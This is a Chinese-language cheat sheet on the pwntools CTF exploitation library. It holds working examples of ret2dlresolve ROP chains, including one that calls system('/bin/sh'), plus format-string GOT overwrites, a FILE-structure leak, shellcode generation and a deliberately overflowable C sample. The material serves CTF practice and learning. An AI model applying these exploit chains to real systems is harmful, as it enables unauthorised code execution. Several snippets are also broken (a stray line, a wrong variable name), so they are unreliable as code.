# Pwntools

‍

‍

‍

‍

‍

## IO-GDB

```python
shell = ssh('travis', 'example.pwnme', password='demopass')

io = gdb.debug(['whoami'],
                ssh = shell,
                gdbscript = '''
break main
continue
''')
```

‍

- 调试shellcode

```python
assembly = shellcraft.echo("Hello world!\n")
shellcode = asm(assembly)
zz
io.recvline()
b'Hello world!\n'




assembly = shellcraft.echo("Hello world!\n")
io = gdb.debug_assembly(assembly) // 调试生成的shellcode

io.interactive()

io.recvline()
b'Hello world!\n'








io = gdb.debug_shellcode()
```

‍

‍

‍

### remote

```python
import socket
import telnetlib
import struct


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(("127.0.0.1",8877))

payload = "A"

s.sendall(payload + '\n')

# 创建telnet 来产生一个控制服务器的shell
t = telnetlib.Telnet()
t.sock = s
t.interact()
```

### process

```python
import subprocess
import telnetlib
from struct import pack

io = subprocess.Popen("./vuln", stdin=subprocess.PIPE, stdout=subprocess.PIPE)

io.stdin.write(b"AAAA")
print(p.stdout.read())



# 可以构造数据包。
payload = pack("<Q", 0xdeadbeef)
t = telnetlib.Telnet()
t.sock = io
t.interact()
```

‍

‍

‍

## shellcraft()

‍

- 用与生成 shellcode

[pwnlib.shellcraft.amd64 — 为 AMD64 架构设计的 shellcode — pwntools 3.12.0dev 文档 (pwntools-docs-zh.readthedocs.io)](https://pwntools-docs-zh.readthedocs.io/zh-cn/dev/shellcraft/amd64.html)

‍

[pwnlib.shellcraft — Shellcode generation — pwntools 4.11.1 documentation](https://docs.pwntools.com/en/stable/shellcraft.html)

‍

- 示例

‍

```python
from pwn import *
context(arch='amd64')

payload = shellcraft.cat("/flag")
```

‍

## FileStructure()

‍

- ​`_IO_1_1_stdout_`​ 任意地址泄露

```python

from pwn import *

fake_IO_file = FileStructure()
fake_IO_file.flags = 0xFBAD1800
fake_IO_file._IO_write_base = environ
fake_IO_file._IO_write_ptr  = environ
fake_IO_file._IO_write_end  = environ + 8
payload = bytes(fake_IO_file)[:0x38]

```

‍

‍

## fmtstr_payload()

‍

```python
fmtstr_payload(offset, writes, numbwritten=0, write_size=‘byte’)
第一个参数表示格式化字符串的偏移；
第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT:systemAddress}；本题是将0804a048处改为0x2223322
第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；
第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。
fmtstr_payload函数返回的就是payload

```

‍

## ret2dlresolve

‍

‍

‍

提供自动有效负载生成，以利用缓冲区溢出 使用 ret2dlresolve。

我们使用以下示例程序：

```python
#include <unistd.h>
void vuln(void){
    char buf[64];
    read(STDIN_FILENO, buf, 200);
}
int main(int argc, char** argv){
    vuln();
}
```

我们可以使用这些示例二进制文件自动执行开发过程。

```python
>>> context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('i386'))
>>> rop = ROP(context.binary)
>>> dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
>>> rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
>>> rop.ret2dlresolve(dlresolve)
>>> raw_rop = rop.chain()
>>> print(rop.dump())
0x0000:        0x80482e0 read(0, 0x804ae00)
0x0004:        0x80484ea <adjust @0x10> pop edi; pop ebp; ret
0x0008:              0x0 arg0
0x000c:        0x804ae00 arg1
0x0010:        0x80482d0 [plt_init] system(0x804ae24)
0x0014:           0x2b84 [dlresolve index]
0x0018:          b'gaaa' <return address>
0x001c:        0x804ae24 arg0
>>> p = elf.process()
>>> p.sendline(fit({64+context.bytes*3: raw_rop, 200: dlresolve.payload}))
>>> p.recvline()
b'pwned\n'
```

您还可以在 AMD64 上使用：`Ret2dlresolve`​

```python
>>> context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('amd64'))
>>> rop = ROP(elf)
>>> dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
>>> rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
>>> rop.ret2dlresolve(dlresolve)
>>> raw_rop = rop.chain()
>>> print(rop.dump())
0x0000:         0x400593 pop rdi; ret
0x0008:              0x0 [arg0] rdi = 0
0x0010:         0x400591 pop rsi; pop r15; ret
0x0018:         0x601e00 [arg1] rsi = 6299136
0x0020:      b'iaaajaaa' <pad r15>
0x0028:         0x4003f0 read
0x0030:         0x400593 pop rdi; ret
0x0038:         0x601e48 [arg0] rdi = 6299208
0x0040:         0x4003e0 [plt_init] system
0x0048:          0x15670 [dlresolve index]
>>> p = elf.process()
>>> p.sendline(fit({64+context.bytes: raw_rop, 200: dlresolve.payload}))
>>> if dlresolve.unreliable:
...     p.poll(True) == -signal.SIGSEGV
... else:
...     p.recvline() == b'pwned\n'
True
```

类 pwnlib.rop.ret2dlresolve。Ret2dlresolvePayload（elf， symbol， args， data_addr=None)[[查看模板]](https://github.com/Gallopsled/pwntools/blob/db98e5edfb/pwnlib/rop/ret2dlresolve.py#L215-L373)创建 ret2dlresolve 有效负载

参数* **elf** （*[ELF](https://docs.pwntools.com/en/stable/elf/elf.html#pwnlib.elf.elf.ELF "pwnlib.elf.elf.ELF")*） – 要搜索的二进制文件

- **symbol** （*[str](https://docs.python.org/3.8/library/stdtypes.html#str "(in Python v3.8)")*） – 要搜索的函数
- **args** （*[list](https://docs.python.org/3.8/library/stdtypes.html#list "(in Python v3.8)")*） – 要传递给函数的参数列表

返回可以传递给的对象`Ret2dlresolvePayloadrop.ret2dlresolve`​

__init__（elf， symbol， args， data_addr=无)[[查看模板]](https://github.com/Gallopsled/pwntools/blob/db98e5edfb/pwnlib/rop/ret2dlresolve.py#L226-L248)__weakref__[[查看模板]](https://github.com/Gallopsled/pwntools/blob/db98e5edfb/pwnlib/rop/ret2dlresolve.py)对对象的弱引用列表（如果已定义）

‍

‍

‍

```python
ret2dlresolve = Ret2dlresolvePayload(elf,'system',['/bin/sh'])
rop = ROP(binary)

rop.read(0, ret2dlresolve.data_addr)
rop.ret2dlresolve(ret2dlresolve)
raw_rop = rop.chain()

print(raw_rop)

pay  = b'A' * 0x18
pay += raw_rop
pause()
s(pay)

pay = ret2dlresolve.payload
pause()
s(pay)
```

‍

‍

## unhex

‍

```python

>>> from pwn import *


>>> unhex('41424344')
b'ABCD'
>>>
```

‍

## base64

‍

```python

>>> from pwn import *

>>> b64e(b'1234')
'MTIzNA=='

>>> b64d('MTIzNA==')
b'1234'
```

‍

‍

## flat-fit

‍

```python
context.arch = 'amd64'

# fit()
# flat()

payload = fit([
    0x1, 0x12, 0x4142434445464748,0xeeee
    ])


payload = flat([
    0x1, 0x12, 0x4142434445464748,0xeeee
    ])
# b'\x01\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x00\x00\x00\x00HGFEDCBA\xee\xee\x00\x00\x00\x00\x00\x00'
```

‍

```python

pay = fit({}, filler=b'\x00', length=0x100)


pay = fit({
    0x00: 0x41424344,
    0x20: 0x45464748,
    },filler=b'\x00')
```

‍

‍

## tempfile

‍

```python

tmpfile = tempfile.mktemp()

print(tmpfile)
```

‍

‍

## wget

‍

‍

```python

url = 'http://127.0.0.1/'

d = wget(url,save='outfile',timeout=5)


print(d)
```

‍

‍

## hashlib

‍

[pwnlib.util.hashes — 散列函数 — pwntools 3.12.0dev 文档](https://pwntools-docs-zh.readthedocs.io/zh-cn/dev/util/hashes.html)

```python
md5file(x)
Calculates the md5 sum of a file

md5filehex(x)
Calculates the md5 sum of a file; returns hex-encoded

md5sum(x)
Calculates the md5 sum of a string

md5sumhex(x)
Calculates the md5 sum of a string; returns hex-encoded

sha1file(x)
Calculates the sha1 sum of a file

sha1filehex(x)
Calculates the sha1 sum of a file; returns hex-encoded

sha1sum(x)
Calculates the sha1 sum of a string

sha1sumhex(x)
Calculates the sha1 sum of a string; returns hex-encoded

sha224file(x)
Calculates the sha224 sum of a file

sha224filehex(x)
Calculates the sha224 sum of a file; returns hex-encoded

sha224sum(x)
Calculates the sha224 sum of a string

sha224sumhex(x)
Calculates the sha224 sum of a string; returns hex-encoded

sha256file(x)
Calculates the sha256 sum of a file

sha256filehex(x)
Calculates the sha256 sum of a file; returns hex-encoded

sha256sum(x)
Calculates the sha256 sum of a string

sha256sumhex(x)
Calculates the sha256 sum of a string; returns hex-encoded

sha384file(x)
Calculates the sha384 sum of a file

sha384filehex(x)
Calculates the sha384 sum of a file; returns hex-encoded

sha384sum(x)
Calculates the sha384 sum of a string

sha384sumhex(x)
Calculates the sha384 sum of a string; returns hex-encoded

sha512file(x)
Calculates the sha512 sum of a file

sha512filehex(x)
Calculates the sha512 sum of a file; returns hex-encoded

sha512sum(x)
Calculates the sha512 sum of a string

sha512sumhex(x)
Calculates the sha512 sum of a string; returns hex-encoded
```
